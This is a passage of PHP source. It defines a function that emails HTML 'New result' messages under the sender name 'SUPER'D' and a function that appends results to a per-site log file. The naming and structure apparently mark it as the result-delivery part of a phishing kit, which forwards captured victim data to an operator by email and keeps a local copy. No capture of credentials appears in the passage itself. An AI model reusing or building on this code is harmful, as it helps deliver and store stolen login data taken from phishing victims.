}

$email =eml();
function sendemail($email, $msg, $subject = "⚠️ New result ⚠️", $fromName = "♛ SUPER'D ♛") {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return false;
    }

    $headers = 'From: ' . $fromName . "\r\n";
    $headers .= 'Reply-To: ' . $fromName . "\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
    

    return mail($email, $subject, $msg, $headers);
}


function savetxt($msg, $siteName = '') {

    if (empty($siteName)) {
        $siteName = getSiteName();
    }
    
    $filePath = '../data/res' . $siteName . '.html';

    $dirPath = dirname($filePath);
    if (!is_dir($dirPath)) {
        mkdir($dirPath, 0755, true);
    }
  
    $formattedMsg = "{$msg}" . PHP_EOL;

    return file_put_contents($filePath, $formattedMsg, FILE_APPEND);
}

